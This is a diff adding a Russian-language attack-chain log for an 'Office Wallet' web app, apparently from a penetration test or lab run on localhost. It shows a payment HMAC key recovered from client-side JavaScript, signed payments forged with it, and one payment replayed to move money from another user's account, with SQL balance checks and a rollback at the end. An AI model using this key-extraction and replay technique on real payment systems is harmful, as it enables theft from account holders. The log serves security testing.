@@ -1,0 +1,52 @@
+OFFICE WALLET · ЦЕПОЧКА АТАКИ
+################################################################################################
+# Ц-4
+################################################################################################
+== Ц-4 · PAYMENT_KEY из pay.js → перевод с чужого счёта ==
+    · Подпись платежа = HMAC(PAYMENT_KEY, 'op:сумма:получатель'), ключ
+    · собирается из /static/pay.js (OW-35). None, срока и привязки к сессии
+    · нет (OW-17) — подписываем платёж сами и повторяем его (OW-17).
+    → GET /static/pay.js (платёжный ключ)
+    ← HTTP 200 /* Payment helpers */ window.PaySign = {   parts: ["office", "-", "wallet", "-", "pay", "-", "key"],   key() {     return this.parts.join("");   } }; 
+    → GET /static/wallet.js (кусок ключа)
+    ← HTTP 200 /* Office Wallet client */ window.OfficeWallet = {   keyParts: ["office", "-", "wallet"],   tipLimitRub: 50,   sessionKey() {     const tail = window.__SK_TAIL__ || "";     return this.keyParts.join("") + tail;   },   formatRub(kop) {     c...
+    → GET /static/legacy-sync.js (хвост ключа)
+    ← HTTP 200 /* Legacy supply sync helpers */ (function () {   window.SupplySync = {     pathParts: ["api", "v2", "supply", "pricing"],     endpoint() {       return "/" + this.pathParts.join("/");     },     async resolveChannel() {       const r = awa...
+    → SQL SELECT id FROM users WHERE login='petrova'
+    ← psql 2
+    → SQL SELECT id FROM users WHERE login='ivanov'
+    ← psql 1
+    → SQL SELECT COALESCE(MAX(id),0) FROM operations
+    ← psql 662
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 957300
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 198936300
+    → POST /pay/replay  (перевод 1, подпись наша)
+    ← HTTP 302 redirect=http://localhost:18081/history  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 957200
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 198936400
+    → POST /pay/replay  (та же подпись — повтор)
+    ← HTTP 302 redirect=http://localhost:18081/history  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 957100
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 198936500
+    → SQL SELECT count(*) FROM operations WHERE id>662 AND memo='повтор операции'
+    ← psql 2
+    ┌─ АРТЕФАКТ · Ц-4 · платёж проведён и повторён по нашей подписи
+    │ GET /static/pay.js → PAYMENT_KEY=office-wallet-pay-key
+    │ HMAC(PAYMENT_KEY, '0:100:1') = 42668901b9b331be6a7ef3a4…
+    │ petrova: 957300 → 957200 → 957100; ivanov: 198936300 → 198936400 → 198936500 (коп)
+    │ HTTP: 200 / 200; новых операций «повтор операции»: 2
+    └─
+    → SQL UPDATE users SET balance_kop=957300 WHERE login='petrova'
+    ← psql UPDATE 1
+    → SQL UPDATE users SET balance_kop=198936300 WHERE login='ivanov'
+    ← psql UPDATE 1
+    → SQL DELETE FROM operations WHERE id>662 AND memo='повтор операции'
+    ← psql DELETE 2
+    откат: балансы восстановлены, повторные операции удалены
+[+] одна подпись провела два перевода с чужого счёта
